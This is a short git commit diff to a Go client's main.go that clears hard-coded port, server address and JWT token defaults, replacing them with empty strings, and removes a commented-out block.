cc534fc8e005309c6738577f0fe70aa4e981a96c
tiagorlampert <tiagorlampert@gmail.com>
2022-10-07 12:05:29 -0300

    r

--- client/main.go
+++ client/main.go
@@ -6,18 +6,11 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/ui"
 )
 
-//var (
-//	Version       = "dev"
-//	Port          = ""
-//	ServerAddress = ""
-//	Token         = ""
-//)
-
 var (
 	Version       = "dev"
-	Port          = "8080"
-	ServerAddress = "localhost"
-	Token         = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE2OTY2MjE4MDEsInVzZXIiOiJkZWZhdWx0In0.QotMkmtA9V5910-Xo0BdWizd5cM51xphR0bDMTqfCjw"
+	Port          = ""
+	ServerAddress = ""
+	Token         = ""
 )
 
 func main() {
